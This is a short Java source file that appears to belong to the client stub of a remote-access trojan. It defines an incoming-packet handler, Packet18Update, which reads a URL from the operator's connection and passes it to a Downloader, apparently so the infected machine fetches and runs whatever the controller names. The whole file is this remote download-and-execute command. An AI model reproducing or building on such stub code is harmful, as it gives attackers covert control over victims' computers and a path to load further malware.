package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.Downloader;

public class Packet18Update extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		new Downloader(url, true).start();
	}

}
